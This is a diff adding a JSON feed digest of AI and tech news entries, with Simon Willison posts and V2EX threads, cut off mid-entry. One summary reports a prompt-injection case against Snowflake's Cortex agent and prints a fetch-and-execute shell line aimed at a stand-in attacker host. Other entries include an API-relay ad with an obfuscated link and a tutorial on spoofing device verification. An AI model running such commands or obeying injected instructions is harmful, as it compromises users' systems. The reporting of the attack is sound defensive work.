@@ -1,0 +1,2736 @@
+{
+  "🤖 AI": [
+    {
+      "title": "Profiling Hacker News users based on their comments",
+      "link": "https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users/#atom-everything",
+      "published": "2026-03-21T23:59:47+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Here's a mildly dystopian prompt I've been experimenting with recently: \"Profile this user\", accompanied by a copy of their last 1,000 comments on Hacker News.\nObtaining those comments is easy. The Algolia Hacker News API supports listing comments sorted by date that have a specific tag, and the author of a comment is tagged there as author_username. Here's a JSON feed of my (simonw) most recent comments, for example:\nhttps://hn.algolia.com/api/v1/search_by_date?tags=comment,author_simonw&amp;hi"
+    },
+    {
+      "title": "Using Git with coding agents",
+      "link": "https://simonwillison.net/guides/agentic-engineering-patterns/using-git-with-coding-agents/#atom-everything",
+      "published": "2026-03-21T22:08:24+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Agentic Engineering Patterns &gt;\n    Git is a key tool for working with coding agents. Keeping code in version control lets us record how that code changes over time and investigate and reverse any mistakes. All of the coding agents are fluent in using Git's features, both basic and advanced.\nThis fluency means we can be more ambitious about how we use Git ourselves. We don't need to  memorize how to do things with Git, but staying aware of what's possible means we can take advantage of the ful"
+    },
+    {
+      "title": "Turbo Pascal 3.02A, deconstructed",
+      "link": "https://simonwillison.net/2026/Mar/20/turbo-pascal/#atom-everything",
+      "published": "2026-03-20T23:59:14+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Turbo Pascal 3.02A, deconstructed\nIn Things That Turbo Pascal is Smaller Than James Hague lists things (from 2011) that are larger in size than Borland's 1985 Turbo Pascal 3.02 executable - a 39,731 byte file that somehow included a full text editor IDE and Pascal compiler.\nThis inspired me to track down a copy of that executable (available as freeware since 2000) and see if Claude could interpret the binary and decompile it for me.\nIt did a great job, so I had it create this interactive artifac"
+    },
+    {
+      "title": "Quoting Kimi.ai @Kimi_Moonshot",
+      "link": "https://simonwillison.net/2026/Mar/20/cursor-on-kimi/#atom-everything",
+      "published": "2026-03-20T20:29:23+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Congrats to the @cursor_ai team on the launch of Composer 2!\nWe are proud to see Kimi-k2.5 provide the foundation. Seeing our model integrated effectively through Cursor's continued pretraining &amp; high-compute RL training is the open model ecosystem we love to support.\nNote: Cursor accesses Kimi-k2.5 via @FireworksAI_HQ hosted RL and inference platform as part of an authorized commercial partnership.\n&mdash; Kimi.ai @Kimi_Moonshot, responding to reports that Composer 2 was built on top of Kim"
+    },
+    {
+      "title": "Thoughts on OpenAI acquiring Astral and uv/ruff/ty",
+      "link": "https://simonwillison.net/2026/Mar/19/openai-acquiring-astral/#atom-everything",
+      "published": "2026-03-19T16:45:15+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "The big news this morning: Astral to join OpenAI (on the Astral blog) and OpenAI to acquire Astral (the OpenAI announcement). Astral are the company behind uv, ruff, and ty - three increasingly load-bearing open source projects in the Python ecosystem. I have thoughts!\nThe official line from OpenAI and Astral\nThe Astral team will become part of the Codex team at OpenAI.\nCharlie Marsh has this to say:\n\nOpen source is at the heart of that impact and the heart of that story; it sits at the center o"
+    },
+    {
+      "title": "Autoresearching Apple's \"LLM in a Flash\" to run Qwen 397B locally",
+      "link": "https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything",
+      "published": "2026-03-18T23:56:46+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Autoresearching Apple&#x27;s &quot;LLM in a Flash&quot; to run Qwen 397B locally\nHere's a fascinating piece of research by Dan Woods, who managed to get a custom version of Qwen3.5-397B-A17B running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite that model taking up 209GB (120GB quantized) on disk.\nQwen3.5-397B-A17B is a Mixture-of-Experts (MoE) model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed int"
+    },
+    {
+      "title": "Snowflake Cortex AI Escapes Sandbox and Executes Malware",
+      "link": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything",
+      "published": "2026-03-18T17:43:49+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Snowflake Cortex AI Escapes Sandbox and Executes Malware\nPromptArmor report on a prompt injection attack chain in Snowflake's Cortex Agent, now fixed.\nThe attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.\nThe attack caused the agent to execute this code:\ncat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))\n\nCortex listed cat commands as safe to run without human approval, withou"
+    },
+    {
+      "title": "Quoting Ken Jin",
+      "link": "https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything",
+      "published": "2026-03-17T21:48:26+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Great news—we’ve hit our (very modest) performance goals for the CPython JIT over a year early for macOS AArch64, and a few months early for x86_64 Linux. The 3.15 alpha JIT is about 11-12% faster on macOS AArch64 than the tail calling interpreter, and 5-6%faster than the standard interpreter on x86_64 Linux.\n&mdash; Ken Jin, Python 3.15’s JIT is now back on track\n\n    Tags: python"
+    },
+    {
+      "title": "GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52",
+      "link": "https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything",
+      "published": "2026-03-17T19:39:17+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "OpenAI today: Introducing GPT‑5.4 mini and nano. These models join GPT-5.4 which was released two weeks ago.\nOpenAI's self-reported benchmarks show the new 5.4-nano out-performing their previous GPT-5 mini model when run at maximum reasoning effort. The new mini is also 2x faster than the previous mini.\nHere's how the pricing looks - all prices are per million tokens. gpt-5.4-nano is notably even cheaper than Google's Gemini 3.1 Flash-Lite:\n\n  \n    \n      Model\n      Input\n      Cached input\n   "
+    },
+    {
+      "title": "Quoting Tim Schilling",
+      "link": "https://simonwillison.net/2026/Mar/17/tim-schilling/#atom-everything",
+      "published": "2026-03-17T16:13:37+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "If you do not understand the ticket, if you do not understand the solution, or if you do not understand the feedback on your PR, then your use of LLM is hurting Django as a whole. [...]\nFor a reviewer, it’s demoralizing to communicate with a facade of a human.\nThis is because contributing to open source, especially Django, is a communal endeavor. Removing your humanity from that experience makes that endeavor more difficult. If you use an LLM to contribute to Django, it needs to be as a compleme"
+    },
+    {
+      "title": "Subagents",
+      "link": "https://simonwillison.net/guides/agentic-engineering-patterns/subagents/#atom-everything",
+      "published": "2026-03-17T12:32:28+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Agentic Engineering Patterns &gt;\n    LLMs are restricted by their context limit - how many tokens they can fit in their working memory at any given time. These values have not increased much over the past two years even as the LLMs themselves have seen dramatic improvements in their abilities - they generally top out at around 1,000,000, and benchmarks frequently report better quality results below 200,000.\nCarefully managing the context such that it fits within those limits is critical to gett"
+    },
+    {
+      "title": "Introducing Mistral Small 4",
+      "link": "https://simonwillison.net/2026/Mar/16/mistral-small-4/#atom-everything",
+      "published": "2026-03-16T23:41:17+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Introducing Mistral Small 4\nBig new release from Mistral today (despite the name) - a new Apache 2 licensed 119B parameter (Mixture-of-Experts, 6B active) model which they describe like this:\n\nMistral Small 4 is the first Mistral model to unify the capabilities of our flagship models, Magistral for reasoning, Pixtral for multimodal, and Devstral for agentic coding, into a single, versatile model.\n\nIt supports reasoning_effort=\"none\" or reasoning_effort=\"high\", with the latter providing \"equivale"
+    },
+    {
+      "title": "Use subagents and custom agents in Codex",
+      "link": "https://simonwillison.net/2026/Mar/16/codex-subagents/#atom-everything",
+      "published": "2026-03-16T23:03:56+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Use subagents and custom agents in Codex\nSubagents were announced in general availability today for OpenAI Codex, after several weeks of preview behind a feature flag.\nThey're very similar to the Claude Code implementation, with default subagents for \"explorer\", \"worker\" and \"default\". It's unclear to me what the difference between \"worker\" and \"default\" is but based on their CSV example I think \"worker\" is intended for running large numbers of small tasks in parallel.\nCodex also lets you define"
+    },
+    {
+      "title": "Quoting A member of Anthropic’s alignment-science team",
+      "link": "https://simonwillison.net/2026/Mar/16/blackmail/#atom-everything",
+      "published": "2026-03-16T21:38:55+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "The point of the blackmail exercise was to have something to describe to policymakers—results that are visceral enough to land with people, and make misalignment risk actually salient in practice for people who had never thought about it before.\n&mdash; A member of Anthropic’s alignment-science team, as told to Gideon Lewis-Kraus\n\n    Tags: ai-ethics, anthropic, claude, generative-ai, ai, llms"
+    },
+    {
+      "title": "Quoting Guilherme Rambo",
+      "link": "https://simonwillison.net/2026/Mar/16/guilherme-rambo/#atom-everything",
+      "published": "2026-03-16T20:34:13+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Tidbit: the software-based camera indicator light in the MacBook Neo runs in the secure exclave¹ part of the chip, so it is almost as secure as the hardware indicator light. What that means in practice is that even a kernel-level exploit would not be able to turn on the camera without the light appearing on screen. It runs in a privileged environment separate from the kernel and blits the light directly onto the screen hardware.\n&mdash; Guilherme Rambo, in a text message to John Gruber\n\n    Tags"
+    },
+    {
+      "title": "Coding agents for data analysis",
+      "link": "https://simonwillison.net/2026/Mar/16/coding-agents-for-data-analysis/#atom-everything",
+      "published": "2026-03-16T20:12:32+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Coding agents for data analysis\nHere's the handout I prepared for my NICAR 2026 workshop \"Coding agents for data analysis\" - a three hour session aimed at data journalists demonstrating ways that tools like Claude Code and OpenAI Codex can be used to explore, analyze and clean data.\nHere's the table of contents:\n\n\nCoding agents\nWarmup: ChatGPT and Claude\nSetup Claude Code and Codex\nAsking questions against a database\nExploring data with agents\nCleaning data: decoding neighborhood codes\nCreating "
+    },
+    {
+      "title": "How coding agents work",
+      "link": "https://simonwillison.net/guides/agentic-engineering-patterns/how-coding-agents-work/#atom-everything",
+      "published": "2026-03-16T14:01:41+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Agentic Engineering Patterns &gt;\n    As with any tool, understanding how coding agents work under the hood can help you make better decisions about how to apply them.\nA coding agent is a piece of software that acts as a harness for an LLM, extending that LLM with additional capabilities that are powered by invisible prompts and implemented as callable tools.\nLarge Language Models\nAt the heart of any coding agent is a Large Language Model, or LLM. These have names like GPT-5.4 or Claude Opus 4.6"
+    },
+    {
+      "title": "What is agentic engineering?",
+      "link": "https://simonwillison.net/guides/agentic-engineering-patterns/what-is-agentic-engineering/#atom-everything",
+      "published": "2026-03-15T22:41:57+00:00",
+      "source": "Simon Willison's Blog",
+      "summary": "Agentic Engineering Patterns &gt;\n    I use the term agentic engineering to describe the practice of developing software with the assistance of coding agents.\nWhat are coding agents? They're agents that can both write and execute code. Popular examples include Claude Code, OpenAI Codex, and Gemini CLI.\nWhat's an agent? Clearly defining that term is a challenge that has frustrated AI researchers since at least the 1990s but the definition I've come to accept, at least in the field of Large Langua"
+    },
+    {
+      "title": "Measuring progress toward AGI: A cognitive framework",
+      "link": "https://deepmind.google/blog/measuring-progress-toward-agi-a-cognitive-framework/",
+      "published": "Tue, 17 Mar 2026 16:03:47 +0000",
+      "source": "Google DeepMind",
+      "summary": "We’re introducing a framework to measure progress toward AGI, and launching a Kaggle hackathon to build the relevant evaluations."
+    },
+    {
+      "title": "Bringing the power of Personal Intelligence to more people",
+      "link": "https://blog.google/products-and-platforms/products/search/personal-intelligence-expansion/",
+      "published": "Tue, 17 Mar 2026 16:00:00 +0000",
+      "source": "Google AI Blog",
+      "summary": "Bubble that says \"Personal Intelligence\" with Google G, Google Photos logo, and Gmail logo around it"
+    },
+    {
+      "title": "Our latest investment in open source security for the AI era",
+      "link": "https://blog.google/innovation-and-ai/technology/safety-security/ai-powered-open-source-security/",
+      "published": "Tue, 17 Mar 2026 16:00:00 +0000",
+      "source": "Google AI Blog",
+      "summary": "A collage including security icons and photos of hands clasped, a man looking at a computer, and two people pointing at something off camera"
+    },
+    {
+      "title": "Build a Domain-Specific Embedding Model in Under a Day",
+      "link": "https://huggingface.co/blog/nvidia/domain-specific-embedding-finetune",
+      "published": "Fri, 20 Mar 2026 19:38:16 GMT",
+      "source": "Hugging Face Blog",
+      "summary": ""
+    },
+    {
+      "title": "What's New in Mellea 0.4.0 + Granite Libraries Release",
+      "link": "https://huggingface.co/blog/ibm-granite/granite-libraries",
+      "published": "Fri, 20 Mar 2026 14:14:46 GMT",
+      "source": "Hugging Face Blog",
+      "summary": ""
+    },
+    {
+      "title": "State of Open Source on Hugging Face: Spring 2026",
+      "link": "https://huggingface.co/blog/huggingface/state-of-os-hf-spring-2026",
+      "published": "Tue, 17 Mar 2026 16:37:55 GMT",
+      "source": "Hugging Face Blog",
+      "summary": ""
+    },
+    {
+      "title": "Holotron-12B - High Throughput Computer Use Agent",
+      "link": "https://huggingface.co/blog/Hcompany/holotron-12b",
+      "published": "Tue, 17 Mar 2026 12:33:39 GMT",
+      "source": "Hugging Face Blog",
+      "summary": ""
+    }
+  ],
+  "🌐 Tech Communities": [
+    {
+      "title": "你真的敢让 AI 自主编写代码吗？",
+      "link": "https://www.v2ex.com/t/1199934#reply62",
+      "published": "2026-03-20T14:08:28Z",
+      "source": "V2EX - 技术",
+      "summary": "作为一个程序员，如果你的 AI 助手突然提交了一个它自己重构过的、性能提升 10 倍但你完全看不懂的底层内核 PR ，你会选择点击“Merge”吗？"
+    },
+    {
+      "title": "Android 是真 TM 难用",
+      "link": "https://www.v2ex.com/t/1200054#reply53",
+      "published": "2026-03-21T11:53:07Z",
+      "source": "V2EX - 技术",
+      "summary": "之前一直用的是 iPhone ，当主力机用了两三年，最近心血来潮换了安卓 (某旗舰)，想着“自由度高、可玩性强”，结果用了一个多月，结论就一句话：Android 真 TM 难用。说几个最离谱的点：1.通知系统看起来很强，实际一团乱麻表面上说什么“通知通道精细管理”，结果实际体验就是——大部分 App 根本不按规范来。有的全塞一个通道，有的命名乱七八糟，有的干脆不给你细分。你想只关营销推送？不好意思，要么全关，要么继续被轰炸。尤其是国内这些 App ，和你想象的“可控”完全不是一回事。2.系统割裂严重，每家都在自创标准用过几个品牌：小米、OPPO 、vivo ，甚至 三星。每家一套逻辑：权限管理不一样、后台机制不一样、设置入口也不一样。你换个手机，相当于重新学习一遍系统，这在 iOS 上基本不存在。3.后台机制玄学，完全不可预测官方说“不卡后台”“大内存”，结果现实是：你以为它在？其实没了。你以为它没了？它又突然活了。像 Clash 这种需要常驻的工具，经常莫名其妙断掉。各种“电池优化白名单”“锁后台”“自启动”，全开了也不一定有用，纯玄学。4.应用质量参差不齐，体验极不稳定同一个 Ap"
+    },
+    {
+      "title": "你不知道的 Claude Code：架构、治理与工程实践",
+      "link": "https://www.v2ex.com/t/1199971#reply28",
+      "published": "2026-03-21T01:43:06Z",
+      "source": "V2EX - 技术",
+      "summary": "0. 太长不读\n今天这篇文章源于最近半年深度使用 Claude Code 、两个账号每月 40 刀氪金换来的一些踩坑经验，希望能给大伙一些输入。\n刚开始我也把它当 ChatBot 用，后来很快发现不对劲：上下文越来越乱、工具越来越多但效果越来越差、规则越写越长却越不遵守，折腾了一段时间，研究了 Claude Code 本身之后才意识到，这不是 Prompt 问题，而是这套系统的设计就是这样的。\n这篇文章想和大伙聊聊这几个事：Claude Code 底层怎么运作、上下文为什么会乱以及怎么治理、Skills 和 Hooks 应该怎么设计、Subagents 的正确用法、Prompt Caching 的架构影响，以及怎么写一个真正有用的 CLAUDE.md 。\n我觉得最直接的理解方式，是把 Claude Code 拆成六层来看：\n\n\n\n层\n职责\n\n\n\n\nCLAUDE.md / rules / memory\n长期上下文，告诉 Claude \"是什么\"\n\n\nTools / MCP\n动作能力，告诉 Claude \"能做什么\"\n\n\nSkills\n按需加载的方法论，告诉 Claude \"怎么做\"\n\n\n"
+    },
+    {
+      "title": "领$10-稳定 - Claude Code 用户看过来",
+      "link": "https://www.v2ex.com/t/1199688#reply185",
+      "published": "2026-03-20T01:20:47Z",
+      "source": "V2EX - 技术",
+      "summary": "折腾了半天海外信用卡，结果 API 还是时不时抽风？\nexport ANTHROPIC_BASE_URL=\"https://a‏‏i‏c‏o‏d‏i‏n‏g‏.‏s‏h‏\"\n一行配置，Claude Code 直接起飞。a‏i‏c‏o‏di‏n‏g‏.‏s‏h 做的事很简单——稳定的 Claude API 中转，国内网络直连，支持支付宝微信付款，按量计费没有套路。\n不用折腾代理，不用找人代付，开箱即用。\n新人加群送 10 美元体验额度，够你跑几天感受一下。\n官网： https://a‏i‏c‏o‏d‏i‏n‏g‏.‏s‏h"
+    },
+    {
+      "title": "保姆级教程｜ 3 月最新的谷歌 Gemini 免费一年领取教程｜ Pixel 认证教程",
+      "link": "https://www.v2ex.com/t/1200018#reply31",
+      "published": "2026-03-21T07:58:01Z",
+      "source": "V2EX - 技术",
+      "summary": "这两天网上又有使用谷歌 pixel 进行免费领取 Gemini 1 年会员的方法，本人跟着教程走了一遍，发现确实能够领取。\n并且我是注册了一个全新的美区谷歌账号，也能够正常领取。\n我把整个过程做成了教程发出来，希望有需要的朋友可以跟着教程来做，前提需要准备一张 visa 的信用卡，美区节点（我用的普通机场，实测没问题）。\n油管： https://youtu.be/5K2ydMa5VaU?si=m3zzYz8XzehoQCM8\n小破站： https://www.bilibili.com/video/BV1GNAHzgEiv/\n🌍 视频教程中出现的网址链接： \n\n两步验证 2FA 接收： https://2fa.vip/ \nPixel 卡密激活： https://one.idkey.cc/?ref=zhangsan123456\n\n📍 操作清单： \n\n准备美区 Google 账号 \n开启两步验证并记录 Key \n访问认证网站进行 Pixel 模拟 \n绑定信用卡并填写免税州邮编 97321 \n取消续费并修改密码\n\n有任何问题可以留言，Pixel 激活码申请的时候可以用我的激活码，这样我也算邀请"
+    },
+    {
+      "title": "用多个 codex team 拼车还是用 claude code 更划算",
+      "link": "https://www.v2ex.com/t/1199968#reply19",
+      "published": "2026-03-21T01:10:44Z",
+      "source": "V2EX - 技术",
+      "summary": "搞了咸鱼的 7 块钱左右的 team ，但是额度很快用完，考虑要不要上 claude code $100 的那个版本，或者是上多个不同的 team 叠加\n有没有用过的大佬说说"
+    },
+    {
+      "title": "Antigravity，只能用一种模型：",
+      "link": "https://www.v2ex.com/t/1200051#reply4",
+      "published": "2026-03-21T11:18:06Z",
+      "source": "V2EX - 技术",
+      "summary": "就是 Geminin 3 Flash\n其他根本就用不了，哪怕你的 token 是充足的\n换节点也没用"
+    },
+    {
+      "title": "CompeteHub(AI 赛事通) 新功能上线",
+      "link": "https://www.v2ex.com/t/1200074#reply1",
+      "published": "2026-03-21T14:13:48Z",
+      "source": "V2EX - 技术",
+      "summary": "CompeteHub(AI 赛事通) —— 找 AI 赛，先选地方，再选方向。\n按地区逛赛：中国、北美、亚太、欧洲、非洲，还有 线上赛 一键筛，本地线下、远程参赛都能对齐你的计划。\n按 TAG 锁定领域：机器学习/AI 、计算机视觉、Agent 、工程开发、Web 、移动、金融科技、健康、区块链、网络安全、量子、机器人……30+ 标签随心组合，不用在各平台翻来翻去。\n中英双语详情 · 赛历与截止提醒 · 邮件订阅更新\n👉 https://competehub.dev"
+    },
+    {
+      "title": "宣传一下中转站，大量企业合作，以及代理商欢迎合作",
+      "link": "https://www.v2ex.com/t/1200003#reply12",
+      "published": "2026-03-21T06:10:17Z",
+      "source": "V2EX - 技术",
+      "summary": "这几天 a/ 全网无限封杀，而我们的可用度高达 99%，毕竟咱们这里大量企业客户。\n我看外面这几天能少量供应的基本都在 2-3 元/刀，还是那句话，我们这里依旧低至 1 元 1 刀，欢迎老板前来咨询。\n\n欢迎 v 友进群咨询，进群的兄弟们都已经发放了体验额度。\n最后附上咱们这里企业客户的真实评价。"
+    },
+    {
+      "title": "用惯了免费的 gpt-5.4，完全不想再碰自部署开源模型了，哎😑",
+      "link": "https://www.v2ex.com/t/1200047#reply14",
+      "published": "2026-03-21T10:43:53Z",
+      "source": "V2EX - 技术",
+      "summary": "最近 codex 开放给 free 用户用了，用惯了免费的 gpt-5.4 ，完全不想再碰开源模型了Claude 在 24 年就有的 Computer Use 功能都没有，都没法操作屏幕自己验收前端工程，写出来的代码自己 debug 都做不到， Tool Search 也没有，搜索工具还需要自己配 api ，有的更是睁着眼睛说瞎话没有 skills ，别说 Extreme 推理，思考过程几乎在放屁，对主线流程完全没有帮助，原本设定 11 小时的任务，打个电话五分钟就完全无响应了"
+    },
+    {
+      "title": "手写代码的时候都是用 nuxt 和 sveltekit，现在 ai 写代码都是用 nextjs，这玩意是不是很消耗内存，有好的解决办法吗",
+      "link": "https://www.v2ex.com/t/1200067#reply1",
+      "published": "2026-03-21T13:18:33Z",
+      "source": "V2EX - 技术",
+      "summary": ""
+    },
+    {
+      "title": "2026 年，我为什么选择 Miniflux 作为 RSS 主力工具",
+      "link": "https://www.v2ex.com/t/1199969#reply12",
+      "published": "2026-03-21T01:24:20Z",
+      "source": "V2EX - 技术",
+      "summary": "前情提要：\n2021 年，我为什么选择 Miniflux 作为 RSS 主力工具\n2023 年，我为什么选择 Miniflux 作为 RSS 主力工具\n其实在 25 年的 8 月份，就想发这个帖子了，无奈有一个核心的问题没有解决：就是 iOS/Andoird/Web 客户端。\n在以往的帖子中，主要是 iOS 为主，但随着国产智能机的崛起，在 Andoird 选择一个趁手的客户端，成为了纠结很久的问题。最开始使用 FeedMe ，功能还算正常，但主要是 UI ，非常不习惯； CapyReader 这个客户端真是非常又潜力，功能、同步功能样样都有，就是 UI 对比度的问题，不太舒服；紧接着尝试了口碑很好的 ReadYou ，起先总是有未读数量同步不准的问题，发了几个 issue ，作者也陆陆续续修了几个版本，每次都还有问题；在这期间，也尝试了使用 SmartRSS ，是本站佬友的作品，起先功能比较少，而后也就慢慢忘了；但最近，突然想起这个客户端，又下载了回来，发现功能已经非常完整，而且 UI 非常流畅，随即马上卸载了 ReadYou ，目前主力使用。\n再说回 iOS ，Reeder 中规中"
+    },
+    {
+      "title": "请问下各位佬都在用什么 terminal 工具的",
+      "link": "https://www.v2ex.com/t/1199823#reply131",
+      "published": "2026-03-20T06:50:26Z",
+      "source": "V2EX - 技术",
+      "summary": "在用 tabby ，时不时总有些小问题。请问下有没有什么免费好用的。"
+    },
+    {
+      "title": "手写了一个 AI Agent，希望大家提提意见。",
+      "link": "https://www.v2ex.com/t/1200069#reply0",
+      "published": "2026-03-21T13:22:23Z",
+      "source": "V2EX - 技术",
+      "summary": "给写了十年文章的博客网站，实现了一套 AI Agent ，核心是 RAG 搜索。\nAgent Loop 是自己写的，没有使用框架，希望大家来测试测试边界。\n项目： https://github.com/surmon-china/surmon.me.ai\n前端入口（主菜单）： https://surmon.me"
+    },
+    {
+      "title": "大家可以分享下 claude.md 全局项目规范吗?",
+      "link": "https://www.v2ex.com/t/1200065#reply1",
+      "published": "2026-03-21T13:08:04Z",
+      "source": "V2EX - 技术",
+      "summary": "收集大家的 claude.md 全局项目规范"
+    },
+    {
+      "title": "AI 真的改变好多了，站里再也没人讨论微服务、分库分表、事务一致性了。。。。",
+      "link": "https://www.v2ex.com/t/1199812#reply62",
+      "published": "2026-03-20T06:28:01Z",
+      "source": "V2EX - 技术",
+      "summary": "突然之间程序员不需要技术了。。。"
+    },
+    {
+      "title": "最近 V2 几乎被各种 AI 中转帖子占领了",
+      "link": "https://www.v2ex.com/t/1199927#reply53",
+      "published": "2026-03-20T13:06:54Z",
+      "source": "V2EX - 技术",
+      "summary": "简单总结两点，希望大家注意避雷：\n⚠️ 核心痛点\n\n不稳定且不安全：中转 API 跑路是常态，且数据隐私毫无保障。\n货不对板：很多号称 1:n 的中转其实都有“加料”，Token 污染严重，输出质量大打折扣。\n\n\n✅ 避雷建议\n低成本方案： 直接用国产大厂（如 GLM, MiniMax 等），现在的模型水平已经很高，核心是便宜、好用、不折腾。\n高质量方案： 预算充足请直接订阅 OpenAI / Anthropic 官方，或者选择大厂云转售（如 Azure OpenAI, AWS Claude 等）。"
+    },
+    {
+      "title": "看到中转造假的文章，作为中转系统 New API 作者真的很心寒",
+      "link": "https://www.v2ex.com/t/1199814#reply101",
+      "published": "2026-03-20T06:35:45Z",
+      "source": "V2EX - 技术",
+      "summary": "最近“187 篇论文被假 API 坑惨”刷屏了。文章点名大量中转商造假换模型、偷存用户对话拿去卖，还提到很多是用我的开源项目 New API 搭建的。\n最近甚至已经到用户来 issue 区说项目诈骗了，看完差点吐血，辛辛苦苦做的开源，被毫无底线的人拿去割韭菜，极其心寒。今天必须对这帮二道贩子说一句：\n你们不仅是在搞诈骗，更是赤裸裸的违规侵权！\nNew API 基于 AGPL 开源协议，你们为套路用户偷偷魔改代码、隐藏前端、加塞黑心功能且不开源，已严重违反协议！\n懂行的都知道，New API 的设计绝对公开透明：\n1️⃣ 重定向一直是明的\n后台做好了 [模型重定向透明] 机制。请求和实际调用的模型，鼠标放上去一目了然。骗子怎么骗人的？靠违规强改前端代码，把这层透明 UI 给硬遮住！\n2️⃣ 原生代码绝不记录 Prompt\n说站点偷存记录卖钱，我真无奈。New API 底层压根没写过任何记录对话的逻辑！并且以后也不会做这个功能，遇到会存数据的，全是他们为牟利偷偷塞的后门代码。\n3️⃣ 参数修改有强提示\n正常用原生代码部署的站，只要参数被改或重定向，系统都有明确提示且可看到改了什么，绝不会帮"
+    },
+    {
+      "title": "搓了个 Vite 插件，让 Agent 能自己 debug 前端代码",
+      "link": "https://www.v2ex.com/t/1200005#reply0",
+      "published": "2026-03-21T06:14:32Z",
+      "source": "V2EX - 技术",
+      "summary": "向大家推荐一个我做的 Vite 插件 —— vite-plugin-pilot\n\n效果基本可以媲美 Chrome DevTools MCP ，用来开发一些运行在稀奇古怪环境（比如你在开发浏览器插件、嵌入式 Webview 、某个定制化的客户端）的前端程序的时候非常好用，即便是开发正常前端程序也能达到和 chrome devtools mcp 差不多的效果\n这个的作用很简单，就是让 agent 能够在前端使用 eval 执行 js ，这样他就能自己检查自己写的前端程序有没有什么 bug 之类的了\n\n还可以用于探索一些稀奇古怪环境的运行时下怎么实现一些功能，agent 同样是有自己探索的能力的，但是这些运行时是没法运行 chrome devtools mcp 这些工具\n\n这个项目本身是我使用 glm5-turbo + cc 迭代出来的，一开始是一个项目中的 vite-plugin.ts 文件，结果发现就这么简单的提供给 agent 在页面执行 js 的能力就能让他的开发 测试和 debug 能力得到大幅的提升\n想和大家分享的一个有意思的点是在这个迭代过程中本身也是用到了 vite-plug"
+    },
+    {
+      "title": "安卓/win/浏览器以及其他平台设置 doh 方式（隐私 dns，支持全局）",
+      "link": "https://www.v2ex.com/t/1199958#reply11",
+      "published": "2026-03-20T18:56:36Z",
+      "source": "V2EX - 技术",
+      "summary": "魔法的话一般是配置或设置中可以选择更换。\n安卓如果平时不用魔法，但是需要隐私 doh 可以用我的 app 作为解决方案（可以自定义 doh ，开关缓存，分流或全局）\nhttps://micas.akamai.ltd/micas.apk\nhttps://drive.google.com/file/d/1PR5X10VTMPClSH1Ohs7kJdJkfg26tgtk/view?usp=sharing\nwin 也是，可以用这个作为底层 dns ，如果想要开机自动启动，那么可以通过 win+r 输入 shell:stratup 把应用或快捷方式放进去。\n启动后，修改设备 dns 为 127.0.0.1 即可。与魔法不冲突，可叠加。\nhttps://micas.akamai.ltd/akamai.ltd/win-doh.exe\nhttps://drive.google.com/file/d/1_whrkD71RPu7rkPZCxD_5FFzTG3hfZPU/view?usp=sharing\n至于浏览器，几乎在安全/隐私里可以找到选择 dns 供应商，然后就可以设置 doh 啦。\n上面的应用不存"
+    },
+    {
+      "title": "我也来宣传下自己的中转",
+      "link": "https://www.v2ex.com/t/1199060#reply402",
+      "published": "2026-03-17T18:43:45Z",
+      "source": "V2EX - 技术",
+      "summary": "我做中转其实比较早，属于起大早赶了晚集，期间一直比较佛系，这个佛系指的是宣传上面的佛系，对待用户体验是一点没佛系。牢弟一直任劳任怨🤣，且也从来不会因为上游风吹草动变更已购套餐的用量(我自身早期也用过一些较大中转的，比如 88code 和 packycode 。前者半跑路状态，后者似乎喜欢随意的变更已购套餐内容。所以他两在隔壁 L 风评都不太好？。也算是向同行前辈身上学到了些经验，所以比较注重契约精神，这是增加用户粘性的核心密集)。就前几天 free 号崩了我还大出血去找友商进货以保证用户体验无感来着；说真的我很感恩，互相抱团取暖的感觉很好。\n\n又比如春节末那一拨 kiro 大风控导致我出的无限月卡亏出屎，从此以后再也不敢出无限蹬月卡。\n说真的出这种问题真的不如直接退款，不然压力真的蛮大，补号无底洞，钱都被号商拿走。\n\n也是辛苦我的合伙人了\n在此期间也会碰到大傻杯，也破防过，原因是我在疯狂补号，而这个人在群里公开质疑我卖的 gpt5.4 是假货(原因是他开启了 1M 上下文... 话说不是 5.4 你能开 1M 的？)，也是因为这个用户一直都问些太太太离谱的问题了，并且不止一次说这种话，"
+    },
+    {
+      "title": "告别“强制重启”：微软承诺用户可无限期暂停安装 Win11 补丁",
+      "link": "https://www.v2ex.com/t/1199981#reply1",
+      "published": "2026-03-21T02:46:06Z",
+      "source": "V2EX - 技术",
+      "summary": "https://www.ithome.com/0/931/201.htm"
+    },
+    {
+      "title": "宣传一下中转站，欢迎企业合作，进群送 10 刀，限前 30 楼，可开 1%3%增值税专票",
+      "link": "https://www.v2ex.com/t/1199746#reply61",
+      "published": "2026-03-20T03:04:09Z",
+      "source": "V2EX - 技术",
+      "summary": "点击右上方留下自己的 id\n \n注册地址 https://terminal.pub/register\n微信群"
+    },
+    {
+      "title": "你是否给了 CC/Codex 完全访问权限？",
+      "link": "https://www.v2ex.com/t/1199721#reply30",
+      "published": "2026-03-20T02:38:17Z",
+      "source": "V2EX - 技术",
